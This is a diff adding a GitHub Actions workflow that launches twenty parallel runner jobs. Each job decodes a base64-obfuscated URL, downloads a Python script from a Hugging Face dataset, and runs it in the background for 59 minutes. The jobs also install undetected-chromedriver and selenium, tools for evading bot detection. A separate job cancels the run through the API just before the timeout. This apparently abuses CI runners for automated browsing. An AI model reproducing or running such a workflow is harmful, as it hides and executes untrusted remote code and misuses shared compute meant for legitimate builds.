@@ -1,1 +1,106 @@
+name: Quasar Drift Sentinel Mesh
 
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: quasar-mesh-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # الرقيب المحوري: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
+  # =================================================================
+  quasar-sentinel:
+    name: "Quasar Sentinel"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Anchor Sentinel Post
+        run: |
+          echo "[SENTINEL] Quasar sentinel anchored. Post locked at the 59-minute meridian."
+          echo "[SENTINEL] Run glyph captured: ${{ github.run_id }}"
+          
+          # فترة الرصد المحددة (3540 ثانية = 59 دقيقة)
+          sleep 3540
+          
+          echo "[SENTINEL] Meridian crossed! Triggering sentinel pulse..."
+          
+          # إطلاق أمر الإلغاء عبر GitHub API
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[SENTINEL] Pulse triggered. Every running and queued drift will be scattered."
+
+  # =================================================================
+  # شبكة الانسياق المتوازية: تركيب وتشغيل عُقد الانسياق
+  # =================================================================
+  drift-mesh:
+    name: "DriftNode-${{ matrix.drift_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        drift_code: [1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الوصلة «1»: تركيب الأساس
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Install Baseplate
+        run: |
+          echo "[BASEPLATE] Installing baseplate for DriftNode-${{ matrix.drift_code }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الوصلة «2»: التقاط الشيفرة العاملة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Intercept Working Code
+        run: |
+          echo "[INTERCEPT] Intercepting drift_worker.py from assigned uplink..."
+          UPLINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$UPLINK" -o drift_worker.py
+          echo "[INTERCEPT] Working code intercepted."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الوصلة «3»: تأمين الحزم الرديفة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Secure Sideline Bundles
+        run: |
+          echo "[SECURE] Securing sideline bundles..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الوصلة «4»: التنفيذ المقيّد بـ 59 دقيقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Discharge Drift Pulse
+        run: |
+          echo ">> Discharging DriftNode-${{ matrix.drift_code }} pulse..."
+          
+          # تشغيل العملية في الخلفية
+          python3 drift_worker.py &
+          DRIFT_PID=$!
+          
+          echo ">> Drift pulse discharged. Meridian: 59 minutes (3540s)."
+          
+          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
+          sleep 3540
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
+          if kill -0 $DRIFT_PID 2>/dev/null; then
+            echo ">> Meridian reached! Discharging pulse shutdown..."
+            kill -9 $DRIFT_PID
+            echo ">> Pulse shut down by meridian keeper."
+          else
+            echo ">> Pulse dissipated within meridian."
+          fi
